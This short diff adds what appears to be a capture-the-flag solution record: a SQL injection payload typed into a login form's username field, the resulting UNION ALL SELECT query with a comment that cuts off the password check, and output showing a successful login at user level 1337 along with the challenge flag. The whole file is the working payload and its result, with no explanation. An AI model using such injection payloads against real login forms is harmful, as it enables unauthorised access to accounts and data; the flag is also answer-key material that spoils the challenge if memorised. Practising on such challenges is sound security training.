@@ -1,0 +1,7 @@
+username: ' UNION ALL SELECT '', '', '', '', 1337 -- 
+password: 
+SQL query: SELECT * FROM users WHERE username='' UNION ALL SELECT '', '', '', '', 1337 -- '
+
+Logged in!
+User level: 1337
+Your flag is: flag_nJZAKGWYt7YfzmTsCV
